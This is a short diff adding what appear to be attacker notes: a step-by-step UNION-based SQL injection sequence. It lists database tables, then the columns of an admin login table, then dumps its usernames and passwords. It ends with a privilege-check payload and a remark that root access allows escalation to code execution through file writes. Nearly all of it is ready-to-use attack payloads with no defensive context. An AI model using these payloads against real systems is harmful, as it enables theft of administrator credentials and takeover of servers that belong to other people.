@@ -1,0 +1,14 @@
+[+] dump table names:
+.1' UNION SELECT 1, group_concat(table_schema, '<br>', table_name), 3, 4, 5, 6 FROM information_schema.tables-- -
+
+[+] dump column names:
+.1' UNION SELECT 1, group_concat(column_name), 3, 4, 5, 6 FROM information_schema.columns WHERE table_name='tbl_adminlogin'-- -
+
+[+] dumping a table
+.1' UNION SELECT 1, group_concat(username, ': ', password), 3, 4, 5, 6 FROM tbl_adminlogin-- -
+
+[+] Possible to get RCE if running as ROOT, check privileges here:
+  - https://medium.com/@root.wav/how-to-get-rce-using-sql-injection-9c994d68c6ef
+
+.146' UNION SELECT 1, 2, group_concat(grantee,is_grantable,0x3c62723e) from information_schema.user_privileges-- -
+  - if YES (root) then we can use outfile
